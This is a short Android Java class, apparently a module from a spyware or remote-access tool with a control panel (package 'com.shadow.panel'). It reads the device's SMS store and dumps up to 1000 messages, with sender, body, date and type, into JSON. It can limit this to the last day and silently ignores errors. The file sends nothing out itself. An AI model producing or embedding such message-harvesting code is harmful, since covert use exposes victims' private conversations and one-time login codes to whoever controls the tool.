package com.shadow.panel;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import org.json.JSONArray;
import org.json.JSONObject;
public class SmsReader {
    public static JSONArray dump(Context ctx, boolean onlyNew) {
        JSONArray arr = new JSONArray();
        String selection = onlyNew ? "date > ?" : null;
        String[] args = onlyNew ? new String[]{String.valueOf(System.currentTimeMillis() - 86400000L)} : null;
        try (Cursor c = ctx.getContentResolver().query(Uri.parse("content://sms"), new String[]{"address", "body", "date", "type"}, selection, args, "date DESC LIMIT 1000")) {
            if (c == null) return arr;
            while (c.moveToNext()) {
                JSONObject o = new JSONObject();
                o.put("address", c.getString(0));
                o.put("body", c.getString(1));
                o.put("date", c.getLong(2));
                o.put("type", c.getInt(3));
                arr.put(o);
            }
        } catch (Exception ignored) {}
        return arr;
    }
}
